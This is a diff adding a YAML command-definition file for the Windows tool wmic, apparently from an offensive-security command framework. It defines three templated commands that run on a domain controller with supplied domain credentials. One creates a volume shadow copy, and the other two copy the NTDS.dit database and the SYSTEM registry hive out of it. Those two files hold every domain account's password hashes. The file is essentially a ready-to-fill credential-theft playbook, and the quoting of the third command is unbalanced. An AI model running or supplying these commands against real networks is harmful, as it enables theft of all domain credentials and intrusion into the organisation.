@@ -1,0 +1,29 @@
+---
+name: wmic
+description: Displays WMI information inside an interactive command shell
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Remotely Create Volume Shadow Copy":
+    - type: ["cmd","standalone"]
+    - text: "wmic /node:{STR} /user:{STR}\\{STR} /password:{STR} process call create \"cmd /c vssadmin create shadow /for=C: 2>&1\""
+    - input: ["domain controller machine name","domain","domain user","password"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Remotely Extract NTDS.dit from Volume Shadow Copy":
+    - type: ["cmd","standalone"]
+    - text: "wmic /node:{STR} /user:{STR}\\{STR} /password:{STR} process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit {FULLPATH} 2>&1\""
+    - input: ["domain controller machine name","domain","domain user","password","extracted ntds.dit file path"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Remotely Extract SYSTEM Hive from Volume Shadow Copy":
+    - type: ["cmd","standalone"]
+    - text: "wmic /node:{STR} /user:{STR}\\{STR} /password:{STR} process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM\\ {FULLPATH} 2>&1"
+    - input: ["domain controller machine name","domain","domain user","password","extracted system backup file path"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
